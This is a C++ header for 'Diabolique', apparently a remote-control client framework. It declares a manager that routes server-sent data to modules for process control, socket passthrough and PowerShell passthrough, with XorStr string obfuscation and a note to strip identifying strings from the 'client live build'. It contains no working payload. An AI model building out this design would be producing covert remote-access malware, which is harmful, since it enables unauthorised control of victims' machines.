/*

	Manages All Loaded Modules And Features Of Diabolique. Server Sends Data Preceeded With A DiabolqiueMessagePacket,
	Index Dictates What Module Data Transfer Is Linked Too

	I was originally going to have the recive from the server thread in here, but I've decided against it. It 
	would make thing a bit more confusing than having a seperate class to handle cli->server 


*/


#ifndef _H_IDIABOLIQUEIO
#define _H_IDIABOLIQUEIO

#include "BaseIncludes.h"
#include <IDataTransfer.h>
#include <IDiaboliqueModule.h>
#if _MSC_VER
#pragma once
#else 
#endif




enum class DiaboliqueModuleType_t
{
	k_dmtProcessController = 0,
	k_dmtSocketPassthrough = 1,
	k_dmtPowershellPassthrough = 2,
};


#if defined(SERVER) || defined(_DEBUG) || defined(SERVER_CLIENT)
#pragma message("REMOVE MODULE TYPE TO STRING FROM CLIENT LIVE BUILD!")
inline std::string ModuleTypeToString(DiaboliqueModuleType_t nType, bool* not_valid = nullptr)
{
	if (not_valid)
		*not_valid = true;

	server_module_preprocessors_t process;
	if (GetPreProcessor((int)nType, process))
		return process.m_Name;

	if (not_valid)
		*not_valid = false;

	return XorStr("Unknown Type!\n");	
}

#endif // #if defined(SERVER) || defined(_DEBUG) || defined(SERVER_CLIENT)


typedef IDiaboliqueModule* (__stdcall* fnCreateModule_t)();

class IDiaboliqueIO
{
public:
	IDiaboliqueIO();

	bool HandleData(int nModule,  void* pData, size_t nDataSize);
	bool RecieveDataFromCurrentModule(int& nModule, void* pBuffer, size_t nDataSize, size_t& nDataRecieved);
	bool RecieveDataFromModule(int nModule, void* pBuffer, size_t nDataSize, size_t& nDataRecieved);
	bool InitializeModule(int nModule, void* pBuffer, size_t nDataSize);
	int CreateNewModule(DiaboliqueModuleType_t nType);

private:
	// Integer References The ID Of The Module
	std::map<int, IDiaboliqueModule*> m_Transfer;
	std::map<DiaboliqueModuleType_t, fnCreateModule_t> m_Creators;
	int m_nCurrentModule = 0;
};







#endif // _H_IDIABOLIQUEIO
